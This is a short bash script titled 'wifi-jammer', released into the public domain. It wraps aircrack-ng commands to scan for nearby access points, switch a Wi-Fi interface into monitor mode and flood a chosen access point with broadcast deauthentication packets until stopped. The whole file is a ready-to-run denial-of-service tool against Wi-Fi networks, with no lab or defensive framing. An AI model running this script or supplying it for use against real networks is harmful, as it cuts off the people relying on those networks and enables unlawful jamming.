 
#!/bin/bash
#
# wifi-jammer
#
# This script uses the aircrack-ng suite to execute a deauthentication(broadcast) 
# attack against an access point.
#
# It works by continuously sending deauthentication requests to the target access 
# point preventing any clients from maintaining a connection.
#
# The script was created using exerts from aircrack-ng.org:
# cracking_wpa tutorial: https://www.aircrack-ng.org/doku.php?id=cracking_wpa
# Deauthentication documentation: https://www.aircrack-ng.org/doku.php?id=deauthentication
#
# License:
# This is free and unencumbered software released into the public domain.
# Anyone is free to copy, modify, publish, use, compile, sell, or distribute this 
# software, either in source code form or as a compiled binary, for any purpose, 
# commercial or non-commercial, and by any means. In jurisdictions that recognize 
# copyright laws, the author or authors of this software dedicate any and all 
# copyright interest in the software to the public domain. We make this dedication 
# for the benefit of the public at large and to the detriment of our heirs and 
# successors. We intend this dedication to be an overt act of relinquishment in
# perpetuity of all present and future rights to this software under copyright law.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, 
# INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR 
# PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS BE LIABLE FOR ANY CLAIM, 
# DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, 
# ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN 
# THE SOFTWARE.
#
# For more information, please refer to http://unlicense.org/
#

#checks-for and kills processes that interfere the aircrack-ng suite
echo "Killing processes that may interfere with aircrack-ng suite..."
airmon-ng check kill

#List Wifi Interfaces
echo "Available wifi interfaces:"
airmon-ng

#Get user to select a wifi interface to use for making connections
echo "Enter the name of the wifi interface to use eg. wlan1"
read wifiInterface

#List access points in range
echo "Identifying access points in range this will take approx. 15 seconds..."
sleep 5
timeout --foreground 10s airodump-ng $wifiInterface

#Get user to select target BSSID and Channel
echo "Enter target access point BSSID eg. C0:4A:00:5A:B8:75"
read targetBSSID

echo "Enter target access point Channel (CH) eg. 11"
read targetChannel

#Start wifi interface in monitor mode for specified channel
echo "Starting wifi interface in monitor mode for target channel..."
airmon-ng start $wifiInterface $targetChannel

#Begin sending deauthentication broadcast packets to the AP
trap ' ' INT
echo "Sending deauthentication packets, press CTRL+C to stop..."
aireplay-ng -0 0 -a $targetBSSID $wifiInterface

#Cleanup, finished so take wifi interface out of monitor mode
echo "Finished, taking wifi interface out of monitor mode..."
airmon-ng stop $wifiInterface

echo "Done."







